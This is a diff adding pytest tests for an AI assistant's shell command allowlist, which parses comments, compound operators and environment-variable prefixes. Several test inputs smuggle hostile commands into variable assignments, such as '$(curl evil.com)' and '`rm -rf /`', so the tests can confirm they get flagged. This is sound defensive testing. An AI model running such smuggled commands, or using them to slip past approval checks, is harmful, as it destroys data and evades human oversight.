@@ -7,7 +7,16 @@ from datetime import date
 import pytest
 
 from ai_assist.config import AiAssistConfig
-from ai_assist.filesystem_tools import ALLOWED_COMMANDS_FILE, ALLOWED_PATHS_FILE, FilesystemTools
+from ai_assist.filesystem_tools import (
+    ALLOWED_COMMANDS_FILE,
+    ALLOWED_PATHS_FILE,
+    SHELL_BUILTINS,
+    FilesystemTools,
+    _is_safe_env_assignment,
+    _split_shell_commands,
+    _strip_shell_comments,
+    extract_command_names,
+)
 
 # --- Phase 1: Command allowlist + user confirmation ---
 
@@ -715,3 +724,255 @@ def test_git_skill_paths_not_added_to_allowed_paths(tmp_path):
     agent._allow_local_skill_paths()
 
     assert len(agent.filesystem_tools.allowed_paths) == initial_count
+
+
+# --- Phase 10: Smart command parsing ---
+
+
+class TestStripShellComments:
+    """Tests for _strip_shell_comments()"""
+
+    def test_no_comment(self):
+        assert _strip_shell_comments("ls /tmp") == "ls /tmp"
+
+    def test_full_line_comment(self):
+        assert _strip_shell_comments("# this is a comment").strip() == ""
+
+    def test_inline_comment(self):
+        result = _strip_shell_comments("ls /tmp # list files")
+        assert "ls /tmp" in result
+        assert "list files" not in result
+
+    def test_hash_in_double_quotes(self):
+        assert _strip_shell_comments('echo "hello # world"') == 'echo "hello # world"'
+
+    def test_hash_in_single_quotes(self):
+        assert _strip_shell_comments("echo 'foo # bar'") == "echo 'foo # bar'"
+
+    def test_escaped_hash(self):
+        assert _strip_shell_comments("echo hello \\# world") == "echo hello \\# world"
+
+
+class TestSplitShellCommands:
+    """Tests for _split_shell_commands()"""
+
+    def test_single_command(self):
+        assert _split_shell_commands("ls /tmp") == ["ls /tmp"]
+
+    def test_and_operator(self):
+        result = _split_shell_commands("ls && pwd")
+        assert len(result) == 2
+        assert "ls" in result[0]
+        assert "pwd" in result[1]
+
+    def test_or_operator(self):
+        result = _split_shell_commands("ls || echo failed")
+        assert len(result) == 2
+
+    def test_semicolon(self):
+        result = _split_shell_commands("ls; pwd")
+        assert len(result) == 2
+
+    def test_pipe(self):
+        result = _split_shell_commands("cat file | grep pattern")
+        assert len(result) == 2
+
+    def test_operators_in_quotes(self):
+        result = _split_shell_commands('echo "a && b"')
+        assert len(result) == 1
+
+    def test_multiple_operators(self):
+        result = _split_shell_commands("ls && pwd; echo done")
+        assert len(result) == 3
+
+
+class TestIsSafeEnvAssignment:
+    """Tests for _is_safe_env_assignment()"""
+
+    def test_simple_assignment(self):
+        assert _is_safe_env_assignment("FOO=bar") is True
+
+    def test_empty_value(self):
+        assert _is_safe_env_assignment("FOO=") is True
+
+    def test_not_assignment(self):
+        assert _is_safe_env_assignment("ls") is False
+
+    def test_command_substitution_dollar_paren(self):
+        assert _is_safe_env_assignment("FOO=$(curl evil.com)") is False
+
+    def test_command_substitution_backtick(self):
+        assert _is_safe_env_assignment("FOO=`rm -rf /`") is False
+
+    def test_brace_expansion(self):
+        assert _is_safe_env_assignment("FOO=${BAR}") is False
+
+    def test_quoted_value(self):
+        assert _is_safe_env_assignment('FOO="hello world"') is True
+
+    def test_quoted_value_with_substitution(self):
+        assert _is_safe_env_assignment('FOO="$(cmd)"') is False
+
+
+class TestExtractCommandNames:
+    """Tests for extract_command_names()"""
+
+    def test_simple_command(self):
+        assert extract_command_names("ls /tmp") == ["ls"]
+
+    def test_full_path(self):
+        assert extract_command_names("/usr/bin/ls /tmp") == ["ls"]
+
+    def test_comment_only(self):
+        assert extract_command_names("# this is a comment") == []
+
+    def test_inline_comment_stripped(self):
+        result = extract_command_names("ls /tmp # list files")
+        assert result == ["ls"]
+        assert "#" not in result
+
+    def test_env_var_prefix(self):
+        result = extract_command_names("FOO=bar curl http://example.com")
+        assert result == ["curl"]
+
+    def test_multiple_env_vars(self):
+        result = extract_command_names("FOO=bar BAZ=qux some_cmd arg")
+        assert result == ["some_cmd"]
+
+    def test_env_var_only(self):
+        result = extract_command_names("FOO=bar")
+        assert result == []
+
+    def test_env_var_with_command_substitution(self):
+        result = extract_command_names("FOO=$(curl evil.com) ls")
+        assert len(result) > 0
+        # Should contain something that forces approval (not just "ls")
+        non_builtin = [n for n in result if n not in SHELL_BUILTINS]
+        assert len(non_builtin) > 0
+
+    def test_env_var_with_backtick(self):
+        result = extract_command_names("FOO=`rm -rf /` ls")
+        non_builtin = [n for n in result if n not in SHELL_BUILTINS]
+        assert len(non_builtin) > 0
+
+    def test_compound_and(self):
+        result = extract_command_names("ls && curl http://example.com")
+        assert "ls" in result
+        assert "curl" in result
+
+    def test_compound_pipe(self):
+        result = extract_command_names("cat file | grep pattern")
+        assert "cat" in result
+        assert "grep" in result
+
+    def test_compound_semicolon(self):
+        result = extract_command_names("ls; pwd")
+        assert "ls" in result
+        assert "pwd" in result
+
+    def test_builtin_only(self):
+        result = extract_command_names("cd /tmp && echo hello")
+        assert all(n in SHELL_BUILTINS for n in result)
+
+    def test_mixed_builtin_and_external(self):
+        result = extract_command_names("cd /tmp && curl http://example.com")
+        assert "cd" in result
+        assert "curl" in result
+
+
+# --- Integration tests for smart parsing with execute_command ---
+
+
+@pytest.mark.asyncio
+async def test_shell_builtins_auto_allowed():
+    """Shell builtins run without prompt or allowlist"""
+    config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["ls"])
+    tools = FilesystemTools(config)
+
+    callback_called = False
+
+    async def track_callback(command: str) -> bool:
+        nonlocal callback_called
+        callback_called = True
+        return True
+
+    tools.confirmation_callback = track_callback
+
+    result = await tools.execute_tool("execute_command", {"command": "cd /tmp"})
+    assert not callback_called
+    assert "not allowed" not in result.lower()
+
+
+@pytest.mark.asyncio
+async def test_echo_builtin_auto_allowed():
+    """echo is a builtin and runs without prompt"""
+    config = AiAssistConfig(anthropic_api_key="test", allowed_commands=[])
+    tools = FilesystemTools(config)
+
+    result = await tools.execute_tool("execute_command", {"command": "echo hello"})
+    assert "not allowed" not in result.lower()
+    assert "hello" in result
+
+
+@pytest.mark.asyncio
+async def test_comment_command_allowed():
+    """Comment-only commands are allowed (they're no-ops)"""
+    config = AiAssistConfig(anthropic_api_key="test", allowed_commands=[])
+    tools = FilesystemTools(config)
+
+    result = await tools.execute_tool("execute_command", {"command": "# this is a comment"})
+    assert "not allowed" not in result.lower()
+
+
+@pytest.mark.asyncio
+async def test_env_var_prefix_checks_actual_command():
+    """Env var prefix is skipped, actual command is checked"""
+    config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["ls"])
+    tools = FilesystemTools(config)
+
+    # curl is not in allowlist — should be blocked
+    result = await tools.execute_tool("execute_command", {"command": "FOO=bar curl http://example.com"})
+    assert "not allowed" in result.lower() or "not in the allowed" in result.lower()
+
+
+@pytest.mark.asyncio
+async def test_env_var_injection_detected():
+    """Env vars with command substitution are NOT skipped"""
+    config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["ls"])
+    tools = FilesystemTools(config)
+
+    # FOO=$(curl evil.com) contains command substitution — should trigger check
+    result = await tools.execute_tool("execute_command", {"command": "FOO=$(curl evil.com) ls"})
+    assert "not allowed" in result.lower() or "not in the allowed" in result.lower()
+
+
+@pytest.mark.asyncio
+async def test_compound_command_checks_all():
+    """Compound commands check all commands, not just the first"""
+    config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["ls"])
+    tools = FilesystemTools(config)
+
+    # ls is allowed but curl is not
+    result = await tools.execute_tool("execute_command", {"command": "ls && curl http://example.com"})
+    assert "not allowed" in result.lower() or "not in the allowed" in result.lower()
+
+
+@pytest.mark.asyncio
+async def test_pipe_checks_all_commands():
+    """Pipe commands check all commands"""
+    config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["cat"])
+    tools = FilesystemTools(config)
+
+    # cat is allowed but unknown_cmd is not
+    result = await tools.execute_tool("execute_command", {"command": "cat /dev/null | unknown_cmd"})
+    assert "not allowed" in result.lower() or "not in the allowed" in result.lower()
+
+
+@pytest.mark.asyncio
+async def test_all_builtin_compound_allowed():
+    """Compound commands with only builtins are auto-allowed"""
+    config = AiAssistConfig(anthropic_api_key="test", allowed_commands=[])
+    tools = FilesystemTools(config)
+
+    result = await tools.execute_tool("execute_command", {"command": "cd /tmp && echo hello && pwd"})
+    assert "not allowed" not in result.lower()
